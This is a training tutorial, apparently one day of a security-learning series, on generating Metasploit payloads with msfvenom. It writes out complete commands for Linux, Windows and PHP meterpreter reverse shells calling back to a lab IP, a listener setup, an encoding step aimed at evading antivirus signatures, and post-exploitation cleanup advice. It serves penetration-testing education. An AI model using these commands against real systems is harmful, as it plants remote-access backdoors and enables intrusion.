# Day 31 – Metasploit: Exploitation Complete (msfvenom)

## Overview

This day focuses on completing the Metasploit exploitation workflow by mastering **msfvenom** for payload generation. The objective is to understand how payloads are created, customized, delivered, and used in real-world exploitation scenarios.

This marks the transition from basic exploitation to **full attack chains**, combining Metasploit Framework and custom payload handling.

---

## Learning Objectives

* Understand what msfvenom is and why it is used
* Generate payloads for different platforms and architectures
* Configure payloads with custom options
* Use payloads with Metasploit handlers
* Apply basic operational security considerations

---

## What is msfvenom?

`msfvenom` is a Metasploit tool used to **generate, encode, and format payloads**. It replaces older tools like `msfpayload` and `msfencode`.

It allows attackers to:

* Create standalone payload files
* Embed payloads into exploits
* Customize payload behavior
* Export payloads in multiple formats

---

## Basic Syntax

```bash
msfvenom -p <payload> [options] -f <format>
```

Key parameters:

* `-p` : Payload to use
* `LHOST` : Attacker IP address
* `LPORT` : Attacker listening port
* `-f` : Output format
* `-o` : Output file

---

## Common Payload Examples

### Linux Reverse Shell (ELF)

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

### Windows Reverse Shell (EXE)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

### PHP Reverse Shell

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php
```

---

## Setting Up the Listener

After generating the payload, a handler must be configured in Metasploit:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

This listener waits for incoming connections from the executed payload.

---

## Encoding Payloads

Encoding helps avoid basic signature-based detection.

Example:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

Notes:

* Encoding is **not true AV evasion**
* Modern antivirus solutions can still detect payloads

---

## Formats and Use Cases

* `exe` → Windows binaries
* `elf` → Linux binaries
* `raw` → Scripts (PHP, ASP, JSP)
* `c`, `python`, `powershell` → Payload embedding

Choosing the correct format depends on the target environment.

---

## Operational Security Notes

* Avoid reusing the same payload repeatedly
* Change ports and payload types when possible
* Clean up uploaded payloads after exploitation
* Understand that msfvenom payloads are noisy in real environments

---

## Red Team Perspective

msfvenom is powerful for:

* Labs and training environments
* Proof of concept exploits
* Rapid payload testing

In real engagements, payload customization and evasion techniques are required.

---

## Summary

* msfvenom completes the Metasploit exploitation workflow
* Payload generation is a critical exploitation step
* Proper configuration of handlers is essential
* Understanding limitations is key for real-world usage

---

